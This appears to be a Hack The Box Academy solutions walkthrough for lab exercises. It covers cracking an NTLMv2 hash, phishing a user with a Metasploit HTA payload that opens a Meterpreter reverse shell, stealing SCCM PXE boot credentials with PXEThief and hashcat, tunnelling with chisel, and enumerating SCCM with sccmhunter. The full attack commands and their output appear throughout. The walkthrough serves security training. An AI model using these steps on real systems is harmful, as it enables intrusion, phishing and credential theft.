hashcat -m 5600 'r.olsen::INLANEFREIGHT:1a636f807fb14937:5193DB0738FD746779348A9291613BC9:0101000000000000004F71D444F4DA01FD8EC2CF02DC18A40000000002000800420055004D004C0001001E00570049004E002D004E00350059005A003000570042004D004C003200360004003400570049004E002D004E00350059005A003000570042004D004C00320036002E00420055004D004C002E004C004F00430041004C0003001400420055004D004C002E004C004F00430041004C0005001400420055004D004C002E004C004F00430041004C0007000800004F71D444F4DA01060004000200000008003000300000000000000001000000002000003AA0213623EEAE4C5ED9F27D23BE706C358E0CE5D828B1A791E42BC93119F2E60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370036000000000000000000' /usr/share/wordlists/rockyou.txt.gz --show
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-xgmydlt504]─[~/ntlm_theft]
└──╼ [★]$ hashcat -m 5600 'r.olsen::INLANEFREIGHT:1a636f807fb14937:5193DB0738FD746779348A9291613BC9:0101000000000000004F71D444F4DA01FD8EC2CF02DC18A40000000002000800420055004D004C0001001E00570049004E002D004E00350059005A003000570042004D004C003200360004003400570049004E002D004E00350059005A003000570042004D004C00320036002E00420055004D004C002E004C004F00430041004C0003001400420055004D004C002E004C004F00430041004C0005001400420055004D004C002E004C004F00430041004C0007000800004F71D444F4DA01060004000200000008003000300000000000000001000000002000003AA0213623EEAE4C5ED9F27D23BE706C358E0CE5D828B1A791E42BC93119F2E60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370036000000000000000000' /usr/share/wordlists/rockyou.txt.gz --show

R.OLSEN::INLANEFREIGHT:1a636f807fb14937:5193db0738fd746779348a9291613bc9:0101000000000000004f71d444f4da01fd8ec2cf02dc18a40000000002000800420055004d004c0001001e00570049004e002d004e00350059005a003000570042004d004c003200360004003400570049004e002d004e00350059005a003000570042004d004c00320036002e00420055004d004c002e004c004f00430041004c0003001400420055004d004c002e004c004f00430041004c0005001400420055004d004c002e004c004f00430041004c0007000800004f71d444f4da01060004000200000008003000300000000000000001000000002000003aa0213623eeae4c5ed9f27d23be706c358e0ce5d828b1a791e42bc93119f2e60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00370036000000000000000000:{hidden}
```

Answer: `Tigger1!`

# Phishing Attacks

## Question 2

### "Perform a phishing attack against r.olsen@inlanefreight.local and get code execution on her computer. What's the content of the flag located at C:\\Users\\r.olsen\\Desktop\\flag.txt"

Students will reuse the previously spawned target and session in `Outlook Web Application`, and utilize `Metasploit` to craft and host a malicious HTA file.

Code: shell

```shell
msfconsole -x "use exploit/windows/misc/hta_server; set LHOST PWNIP; set LPORT PWNPO; set SRVHOST PWNIP; run -j" 
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-xgmydlt504]─[~]
└──╼ [★]$ msfconsole -x "use exploit/windows/misc/hta_server; set LHOST 10.10.14.76; set LPORT 9001; set SRVHOST 10.10.14.76; run -j" 

Metasploit tip: Set the current module's RHOSTS with database values using 
hosts -R or services -R
<SNIP>

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
LHOST => 10.10.14.76
LPORT => 9001
SRVHOST => 10.10.14.76
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.76:9001 
[*] Using URL: http://10.10.14.76:8080/mFSj7SQytZ1v.hta
[*] Server started.
```

Subsequently, students will copy the generated URL and create a malicious email targeting `r.olsen@inlanefreight.local` while providing the URL.

![[HTB Solutions/CAPE/z. images/a330d04d113fa0dad4118d640224c4f0_MD5.jpg]]

After a while, students will notice that a meterpreter session was established:

```
<SNIP>
[msf](Jobs:1 Agents:0) exploit(windows/misc/hta_server) >> 
[*] 10.129.231.81    hta_server - Delivering Payload
[*] Sending stage (175686 bytes) to 10.129.231.81
[*] Meterpreter session 1 opened (10.10.14.76:9001 -> 10.129.231.81:61579) at 2024-08-22 03:54:50 -0500
```

Subsequently, they will display the number of sessions and will interact with the established session as `INLANEFREIGHT\r.olsen`:

Code: shell

```shell
sessions -i
sessions -i 1
```

```
[msf](Jobs:1 Agents:1) exploit(windows/misc/hta_server) >> sessions -i

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x86/windows  INLANEFREIGHT\r.olsen @ DC01  10.10.14.76:9001 -> 10.129.231.81:61579 (172.35.0.3)

[msf](Jobs:1 Agents:1) exploit(windows/misc/hta_server) >> sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(C:\Users\r.olsen) >
```

Students will grab the flag located in `C:\Users\r.olsen\Desktop`:

Code: shell

```shell
cat C:/Users/r.olsen/Desktop/flag.txt
```

Code: shell

```shell
(Meterpreter 1)(C:\Users\r.olsen) > cat C:/Users/r.olsen/Desktop/flag.txt
```

Answer: `I_GoT_Phished`

# Introduction to SCCM

## Question 1

### "Coerce PXE Boot and decrypt the password. What's the password for the PXE Boot?"

After spawning the target, students will establish an RDP session using the credentials `test:Labtest01`:

Code: shell

```shell
xfreerdp /v:STMIP /u:test /p:Labtest01 /dynamic-resolution
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-uxsq1lwekn]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.71 /u:test /p:Labtest01 /dynamic-resolution

[05:07:09:189] [13919:13946] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[05:07:09:190] [13919:13946] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[05:07:09:190] [13919:13946] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[05:07:10:385] [13919:13946] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:07:10:386] [13919:13946] [WARN][com.freerdp.crypto] - CN = SRV05
[05:07:10:386] [13919:13946] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:07:10:386] [13919:13946] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:07:10:386] [13919:13946] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:07:10:387] [13919:13946] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.231.71:3389) 
[05:07:10:387] [13919:13946] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:07:10:387] [13919:13946] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:07:10:387] [13919:13946] [ERROR][com.freerdp.crypto] - 	SRV05
[05:07:10:387] [13919:13946] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.231.71:3389 (RDP-Server):
	Common Name: SRV05
	Subject:     CN = SRV05
	Issuer:      CN = SRV05
	Thumbprint:  83:02:11:7e:e9:10:23:2a:45:2e:3f:6c:14:b7:2f:95:b1:5e:63:4d:0c:4c:18:26:30:ed:58:8c:25:20:74:c5
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open `PowerShell`, navigate to `C:\Tools\PXEThief`, and are going to coerce the PXE boot media against the `172.50.0.30` host:

Code: powershell

```powershell
cd C:\Tools\PXEthief
python .\pxethief.py 2 172.50.0.30
```

```
PS C:\Users\test> cd C:\Tools\PXEthief
PS C:\Tools\PXEthief> python .\pxethief.py 2 172.50.0.30

<SNIP>

[+] Generating and downloading encrypted media variables file from MECM server located at 172.50.0.30
[+] Using interface: \Device\NPF_{75AFD1DE-4288-47E1-A71B-76A6D61D3E92} - vmxnet3 Ethernet Adapter
[+] Targeting user-specified host: 172.50.0.30

[+] Asking ConfigMgr for location to download the media variables and BCD files...

Begin emission:
Finished sending 1 packets.
.*
Received 2 packets, got 1 answers, remaining 0 packets

[!] Variables File Location: \SMSTemp\2024.08.22.12.10.36.0001.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.var
[!] BCD File Location: \SMSTemp\2024.08.22.12.10.35.03.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.bcd
[+] Use this command to grab the files:
tftp -i 172.50.0.30 GET "\SMSTemp\2024.08.22.12.10.36.0001.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.var" "2024.08.22.12.10.36.0001.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.var"
tftp -i 172.50.0.30 GET "\SMSTemp\2024.08.22.12.10.35.03.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.bcd" "2024.08.22.12.10.35.03.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.bcd"
[+] User configured password detected for task sequence media. Attempts can be made to crack this password using the relevant hashcat module
```

Subsequently, they will copy the generated `tftp` command to download the `boot.var` file locally:

Code: powershell

```powershell
tftp -i 172.50.0.30 GET "\SMSTemp\2024.08.22.12.10.36.0001.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.var" "2024.08.22.12.10.36.0001.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.var"
```

```
PS C:\Tools\PXEthief> tftp -i 172.50.0.30 GET "\SMSTemp\2024.08.22.12.10.36.0001.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.var" "2024.08.22.12.10.36.0001.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.var"

Transfer successful: 12776 bytes in 1 second(s), 12776 bytes/s
```

Students will run `pxethief.py` in mode `5` to retrieve the hash corresponding to the media file for subsequent cracking against the downloaded `boot.var` media file:

Code: powershell

```powershell
python .\pxethief.py 5 '.\2024.08.22.12.10.36.0001.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.var'
```

```
PS C:\Tools\PXEthief> python .\pxethief.py 5 '.\2024.08.22.12.10.36.0001.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.var'

<SNIP>

Hashcat hash: $sccm$aes128$0000edec14000000be310000c03100000e6600000000000011cb54aa3b699f61f86ab312e6fb97ec
```

They will return to their workstations, clone the specific `hashcat` module, and install it:

Code: shell

```shell
mkdir hashcat_pxe/
cd hashcat_pxe/
git clone https://github.com/hashcat/hashcat.git
git clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
cp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/
cp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850* hashcat/OpenCL/
cd hashcat/
git checkout -b v6.2.5 tags/v6.2.5
make
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-uxsq1lwekn]─[~]
└──╼ [★]$ mkdir hashcat_pxe/
cd hashcat_pxe/
git clone https://github.com/hashcat/hashcat.git
git clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
cp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/
cp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850* hashcat/OpenCL/
cd hashcat/
git checkout -b v6.2.5 tags/v6.2.5
make

Cloning into 'hashcat'...
remote: Enumerating objects: 91438, done.
remote: Counting objects: 100% (28082/28082), done.
remote: Compressing objects: 100% (6191/6191), done.
remote: Total 91438 (delta 22007), reused 21891 (delta 21891), pack-reused 63356 (from 1)
Receiving objects: 100% (91438/91438), 78.16 MiB | 22.41 MiB/s, done.
<SNIP>
```

Subsequently, students will run `hashcat` in mode `19850`, use `rockyou` as a dictionary file, and specify the hash to be cracked:

Code: shell

```shell
./hashcat -m 19850 --force -a 0 '$sccm$aes128$0000edec14000000be310000c03100000e6600000000000011cb54aa3b699f61f86ab312e6fb97ec' /usr/share/wordlists/rockyou.txt.gz 
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-uxsq1lwekn]─[~/hashcat_pxe/hashcat]
└──╼ [★]$ ./hashcat -m 19850 --force -a 0 '$sccm$aes128$0000edec14000000be310000c03100000e6600000000000011cb54aa3b699f61f86ab312e6fb97ec' /usr/share/wordlists/rockyou.txt.gz 

hashcat (v6.2.5) starting

<SNIP>

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$sccm$aes128$0000edec14000000be310000c03100000e6600000000000011cb54aa3b699f61f86ab312e6fb97ec:{hidden}
                                                          
<SNIP>
```

Students will proceed to reuse `hashcat` to show the cracked password, which they will submit as an answer:

Code: shell

```shell
./hashcat -m 19850 --force -a 0 '$sccm$aes128$0000edec14000000be310000c03100000e6600000000000011cb54aa3b699f61f86ab312e6fb97ec' /usr/share/wordlists/rockyou.txt.gz --show
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-uxsq1lwekn]─[~/hashcat_pxe/hashcat]
└──╼ [★]$ ./hashcat -m 19850 --force -a 0 '$sccm$aes128$0000edec14000000be310000c03100000e6600000000000011cb54aa3b699f61f86ab312e6fb97ec' /usr/share/wordlists/rockyou.txt.gz --show

$sccm$aes128$0000edec14000000be310000c03100000e6600000000000011cb54aa3b699f61f86ab312e6fb97ec:{hidden}
```

Answer: `Password1`

# Introduction to SCCM

## Question 2

### "What's the password for the sccm\_push account? (Save all the passwords you have found for the upcoming sections)"

Students will return to the previously established RDP session and use `pxethief.py` in mode `3` to attempt to decrypt the saved media file and retrieve the password while specifying the password found in the previous question:

Code: powershell

```powershell
python .\pxethief.py 3 '.\2024.08.22.12.10.36.0001.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.var' "Password1"
```

```
PS C:\Tools\PXEthief> python .\pxethief.py 3 '.\2024.08.22.12.10.36.0001.{3EC4F2D4-9782-4D51-9797-DA65D6C82D8E}.boot.var' "Password1"

<SNIP>
[!] Possible credential fields found!

In TS Step "Apply Windows Settings":
OSDRegisteredUserName - sccm_admin
OSDLocalAdminPassword - Pxetesting01

In TS Step "Apply Network Settings":
OSDJoinAccount - LAB\sccm_push
OSDJoinPassword - {hidden}
<SNIP>
```

Students will submit the password found in the `OSDJoinPassword` variable.

Answer: `Welcome01$`

# Introduction to SCCM

## Question 3

### "Connect to the shared folder \\\\LAB-DC\\SCCMShare\\PUSH using the PUSH account and read the content of the flag.txt."

Students will utilize the previously spawned `PowerShell` session and will spawn another `PowerShell` session in the context of the `LAB\sccm_push` account and the password found in the previous question:

Code: powershell

```powershell
runas /netonly /user:LAB\sccm_push powershell
```

```
PS C:\Tools\PXEthief> runas /netonly /user:LAB\sccm_push powershell

Enter the password for LAB\sccm_push:
Attempting to start powershell as user "LAB\sccm_push" ...
```

Subsequently, in the newly spawned `PowerShell` session, students will grab the flag located in `\\LAB-DC\SCCMShare\PUSH` share:

Code: powershell

```powershell
type \\LAB-DC\SCCMShare\PUSH\flag.txt
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> type \\LAB-DC\SCCMShare\PUSH\flag.txt
```

Answer: `Account_Used_To_DomainJoin`

# Introduction to SCCM

## Question 4

### "Use one of the credentials you found to read the content of the flag C:\\Users\\Administrator\\Desktop\\flag.txt"

Students will close the previously spawned `PowerShell` session in the context of the `sccm_push` account and are going spawn another `PowerShell` session as an Administrator, whose credentials can be found in the 2nd question in the `OSDLocalAdminPassword` variable:

![[HTB Solutions/CAPE/z. images/e7083efe86ad72aa796fd8285f048ab1_MD5.jpg]]

Subsequently, students will grab the flag located in `C:\Users\Administrator\Desktop`:

Code: powershell

```powershell
type C:\Users\Administrator\Desktop\flag.txt
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.t
```

Answer: `Config_The_Same_LocalAdmin`

# SCCM Auditing

## Question 1

### "Which account is a member of the group SCCM\_users and doesn't have sccm in the name?"

After spawning the target, students will download pre-compiled `chisel` binaries for Linux and Windows from the [releases](https://github.com/jpillora/chisel/releases/tag/v1.10.0):

Code: shell

```shell
wget -q https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.deb
wget -q https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_windows_amd64.gz
sudo dpkg -i chisel_1.10.0_linux_amd64.deb
gunzip chisel_1.10.0_windows_amd64.gz
mv chisel_1.10.0_windows_amd64 chisel.exe
```

```
┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-sr5x5iu2xb]─[~]
└──╼ [★]$ wget -q https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.deb
wget -q https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_windows_amd64.gz
sudo dpkg -i chisel_1.10.0_linux_amd64.deb
gunzip chisel_1.10.0_windows_amd64.gz
mv chisel_1.10.0_windows_amd64 chisel.exe

Selecting previously unselected package chisel.
(Reading database ... 567240 files and directories currently installed.)
Preparing to unpack chisel_1.10.0_linux_amd64.deb ...
Unpacking chisel (1.10.0) ...
Setting up chisel (1.10.0) ...
```

Students will start `chisel` in `server` mode on their workstations:

Code: shell

```shell
chisel server --reverse
```

```
┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-sr5x5iu2xb]─[~]
└──╼ [★]$ chisel server --reverse

2024/08/23 00:14:54 server: Reverse tunnelling enabled
2024/08/23 00:14:54 server: Fingerprint lW/EZOnfuuDJ9hMEJhdI9W2t54r2B9yDhfe/JolDSzY=
2024/08/23 00:14:54 server: Listening on http://0.0.0.0:8080
```

Subsequently, they will open a new terminal tab and establish an RDP session with the target using `xfreerdp`:

Code: shell

```shell
xfreerdp /v:STMIP /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy
```

```
┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-sr5x5iu2xb]─[~]
└──╼ [★]$ xfreerdp /v:10.129.122.22 /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy

[00:21:38:660] [105239:105240] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:21:38:660] [105239:105240] [WARN][com.freerdp.crypto] - CN = SRV01.lab.local
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.122.22:3389) 
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - 	SRV01.lab.local
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.122.22:3389 (RDP-Server):
	Common Name: SRV01.lab.local
	Subject:     CN = SRV01.lab.local
	Issuer:      CN = SRV01.lab.local
	Thumbprint:  52:ab:92:ff:f6:13:4f:72:15:9e:22:69:8e:8a:4a:16:57:80:2c:93:bd:c7:72:2f:8d:bf:c7:bf:7e:9b:c0:ae
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open `PowerShell` and will transfer the `chisel` executable file on the target machine in their current working directories:

Code: powershell

```powershell
cp \\TSCLIENT\academy\chisel.exe .
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\blwasp> cp \\TSCLIENT\academy\chisel.exe .
```

Subsequently, they will connect to the previously started `chisel` server using `client` mode to establish a SOCKS proxy:

Code: powershell

```powershell
.\chisel.exe client PWNIP:8080 R:socks
```

```
PS C:\Users\blwasp> .\chisel.exe client 10.10.14.84:8080 R:socks

2024/08/23 07:26:09 client: Connecting to ws://10.10.14.84:8080
2024/08/23 07:26:10 client: Connected (Latency 79.2543ms)
```

Students will return to their workstations and modify the `proxychains.conf` configurational file, changing the protocol from `socks4` to `socks5` and the port from `9050` to `1080`:

Code: shell

```shell
sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf; sed -i s/9050/1080/g /etc/proxychains.conf'
```

```
┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-sr5x5iu2xb]─[~]
└──╼ [★]$ sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf; sed -i s/9050/1080/g /etc/proxychains.conf'
```

Right after, they will proceed to clone `sccmhunter`, initiating a Python virtual environment and installing the requirements:

Code: shell

```shell
git clone https://github.com/garrettfoster13/sccmhunter.git
cd sccmhunter
virtualenv --python=python3 .
source bin/activate
sudo pip3 install -r requirements.txt
```

```
┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-tvuccczp5a]─[~]
└──╼ [★]$ git clone https://github.com/garrettfoster13/sccmhunter.git
cd sccmhunter
virtualenv --python=python3 .
source bin/activate
sudo pip3 install -r requirements.txt

Cloning into 'sccmhunter'...
remote: Enumerating objects: 680, done.
remote: Counting objects: 100% (555/555), done.
remote: Compressing objects: 100% (286/286), done.
remote: Total 680 (delta 331), reused 479 (delta 269), pack-reused 125 (from 1)
Receiving objects: 100% (680/680), 475.90 KiB | 1.66 MiB/s, done.
Resolving deltas: 100% (406/406), done.
created virtual environment CPython3.11.2.final.0-64 in 253ms
  creator CPython3Posix(dest=/home/htb-ac-8414/sccmhunter, clear=False, no_vcs_ignore=False, global=False)
  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/htb-ac-8414/.local/share/virtualenv)
    added seed packages: pip==23.0.1, setuptools==66.1.1, wheel==0.38.4
  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator
<SNIP>
```

Students will utilize `sccmhunter` to enumerate the SCCM environment using the `find` command and the credentials `blwasp:Password123!` through the previously established SOCKS proxy targeting the domain controller located at the `172.50.0.10` IP address:

Code: shell

```shell
sudo proxychains -q python3 sccmhunter.py find -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10
```

```
(sccmhunter) ┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-hv9jvdmph3]─[~/sccmhunter]
└──╼ [★]$ sudo proxychains -q python3 sccmhunter.py find -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10

Authorization required, but no authorization protocol specified
Authorization required, but no authorization protocol specified

(sccmhunter.py:13579): Gtk-CRITICAL **: 01:13:02.420: gtk_clipboard_get_for_display: assertion 'display != NULL' failed
SCCMHunter v1.0.5 by @garrfoster
[01:13:02 AM] INFO     [!] First time use detected.
[01:13:02 AM] INFO     [!] SCCMHunter data will be saved to /root/.sccmhunter   
[01:13:03 AM] INFO     [*] Checking for System Management Container.            
[01:13:03 AM] INFO     [+] Found System Management Container. Parsing DACL.
[01:13:04 AM] INFO     [+] Found 2 computers with Full Control ACE
[01:13:04 AM] INFO     [*] Querying LDAP for published Sites and Management     
                       Points
[01:13:04 AM] INFO     [+] Found 1 Management Points in LDAP.                   
[01:13:04 AM] INFO     [*] Searching LDAP for anything containing the strings   
                       'SCCM' or 'MECM'
[01:13:04 AM] INFO     [+] Found 9 principals that contain the string 'SCCM' or 
                       'MECM'.  
```

Subsequently, students will enumerate the gathered data about the environment within the `show` command and grep for the `GROUPS` table, finding the user:

Code: shell

```shell
sudo python3 sccmhunter.py show -all | grep GROUPS -A 9
```

```
(sccmhunter) ┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-hv9jvdmph3]─[~/sccmhunter]
└──╼ [★]$ sudo python3 sccmhunter.py show -all | grep GROUPS -A 9

<SNIP>
gtk_clipboard_get_for_display: assertion 'display != NULL' failed
[01:18:46 AM] INFO     [+] Showing GROUPS Table                                                                                      
[01:18:46 AM] INFO     +------------+------------+------------------+----------------------------------------+---------------+       
                       | cn         | name       | sAMAAccontName   | member                                 | description   |       
                       +============+============+==================+========================================+===============+       
                       | SCCM_users | SCCM_users | SCCM_users       | CN={hidden} MC,CN=Users,DC=lab,DC=local     |               |       
                       |            |            |                  | CN=sccm_push,CN=Users,DC=lab,DC=local  |               |       
                       |            |            |                  | CN=sccm_naa,CN=Users,DC=lab,DC=local   |               |       
                       |            |            |                  | CN=sccm_admin,CN=Users,DC=lab,DC=local |               |       
                       |            |            |                  | CN=sccm_sql,CN=Users,DC=lab,DC=local   |               |       
                       +------------+------------+------------------+----------------------------------------+---------------+   
```

Answer: `Rai`

# SCCM Auditing

## Question 2

### "Which computer is not SMSProvider?"

Students will reuse the previously established chain of connections and will utilize `sccmhunter` with the `smb` command to profile the site servers using the credentials `blwasp:Password123!`. They will scrutinize the output finding the host that is not an `SMSProvider`:

Code: shell

```shell
sudo proxychains -q python3 sccmhunter.py smb -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10 -save
```

```
(sccmhunter) ┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-hv9jvdmph3]─[~/sccmhunter]
└──╼ [★]$ sudo proxychains -q python3 sccmhunter.py smb -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10 -save

Authorization required, but no authorization protocol specified

Authorization required, but no authorization protocol specified

(sccmhunter.py:38455): Gtk-CRITICAL **: 01:28:50.694: gtk_clipboard_get_for_display: assertion 'display != NULL' failed
SCCMHunter v1.0.5 by @garrfoster
[01:28:50 AM] INFO     Profiling 2 site servers.                                                                                     
[01:28:56 AM] INFO     [+] Finished profiling Site Servers.                                                                          
[01:28:56 AM] INFO     +------------------+------------+-------+-----------------+--------------+---------------+----------+---------
                       +                                                                                                             
                       | Hostname         | SiteCode   | CAS   | SigningStatus   | SiteServer   | SMSProvider   | Config   | MSSQL   
                       |                                                                                                             
                       +==================+============+=======+=================+==============+===============+==========+=========
                       +                                                                                                             
                       | sccm02.lab.local | HTB        | False | False           | True         | True          | Passive  | False   
                       |                                                                                                             
                       +------------------+------------+-------+-----------------+--------------+---------------+----------+---------
                       +                                                                                                             
                       | {hidden}.lab.local | HTB        | False | False           | True         | False         | Active   | False   
                       |                                                                                                             
                       +------------------+------------+-------+-----------------+--------------+---------------+----------+---------
```

Answer: `SCCM01`

# SCCM Auditing

## Question 3

### "Which computer has the WSUS service?"

Students will utilize the command from the previous question and pipe the output to `less -S` to disable line wrapping and scrutinize the `WSUS` column:

Code: shell

```shell
sudo proxychains -q python3 sccmhunter.py smb -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10 -save | less -S
```

```
(sccmhunter) ┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-hv9jvdmph3]─[~/sccmhunter]
└──╼ [★]$ sudo proxychains -q python3 sccmhunter.py smb -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10 -save | less -S

<SNIP>
[01:35:50 AM] INFO     Profiling 3 computers.
[01:36:01 AM] INFO     [+] Finished profiling all discovered computers.                                                                                                                       
[01:36:01 AM] INFO     +--------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                      
                       | Hostname           | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |                      
                       +====================+============+=================+==============+===================+=====================+===============+========+=========+                      
                       | sccm02.lab.local   | HTB        | False           | False        | False             | False               | True          | False  | False   |                      
                       +--------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                      
                       | sccm-sms.lab.local | None       | False           | False        | False             | False               | True          | False  | False   |                      
                       +--------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                      
                       | {hidden}.lab.local   | HTB        | False           | True         | True              | False               | False         | True   | False   |                      
                       +--------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+ 
```

Answer: `SCCM01`

# SCCM Auditing

## Question 4

### "Which computer has the passive config?"

Students will utilize the command from the previous question and grep for the word `Passive`:

Code: shell

```shell
sudo proxychains -q python3 sccmhunter.py smb -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10 -save | grep Passive -B 2
```

```
(sccmhunter) ┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-hv9jvdmph3]─[~/sccmhunter]
└──╼ [★]$ sudo proxychains -q python3 sccmhunter.py smb -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10 -save | grep Passive -B 2

<SNIP>
                       | Hostname         | SiteCode   | CAS   | SigningStatus   | SiteServer   | SMSProvider   | Config   | MSSQL   |                                                        
                       +==================+============+=======+=================+==============+===============+==========+=========+                                                        
                       | {hidden}.lab.local | HTB        | False | False           | True         | True          | Passive  | False   |
```

Answer: `SCCM02`

# Abusing SCCM

## Question 1

### "Perform a password spray attack using all the passwords you have collected from the PXE boot to uncover Rai's credentials. What is Rai's password?"

Students will have to reuse the credentials obtained in the `Introduction to SCCM` section and create a password list:

Code: shell

```shell
cat << EOF > passwords.txt
Password123!
Pxetesting01
Welcome01$
EOF
```

```
┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-e45gbp5lqc]─[~]
